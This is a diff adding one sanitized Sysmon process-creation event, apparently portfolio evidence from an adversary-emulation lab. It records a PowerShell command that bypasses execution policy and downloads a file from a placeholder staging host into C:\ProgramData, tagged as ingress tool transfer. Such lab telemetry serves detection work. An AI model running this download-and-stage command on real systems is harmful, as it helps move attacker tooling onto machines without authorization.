@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Sanitized portfolio evidence. Dates, endpoint-specific identifiers,
+     lab-user details, agent details, hashes, and live infrastructure values removed. -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" />
+    <EventID>1</EventID>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>REDX-VM-WKS-01</Computer>
+  </System>
+  <EventData>
+    <Data Name="RuleName">technique_id=T1083,technique_name=File and Directory Discovery</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -C "$destination='C:\ProgramData\RG-AE-001\stage\rg-ae-001-stage.txt';New-Item -Path (Split-Path -Parent $destination) -ItemType Directory -Force | Out-Null;Invoke-WebRequest -Uri 'http://staging-server.example.invalid/rg-ae-001-stage.txt' -OutFile $destination -UseBasicParsing;[PSCustomObject]@{Campaign='RG-AE-001';Step='05';Technique='T1105';Path=$destination;SHA256=(Get-FileHash -Path $destination -Algorithm SHA256).Hash;Bytes=(Get-Item $destination).Length} | ConvertTo-Json -Compress"</Data>
+    <Data Name="CurrentDirectory">C:\Users\REDACTED-LAB-USER\</Data>
+    <Data Name="User">REDACTED-LAB-USER</Data>
+    <Data Name="IntegrityLevel">High</Data>
+    <Data Name="ParentImage">C:\Users\Public\[REDACTED-AGENT].exe</Data>
+  </EventData>
+</Event>
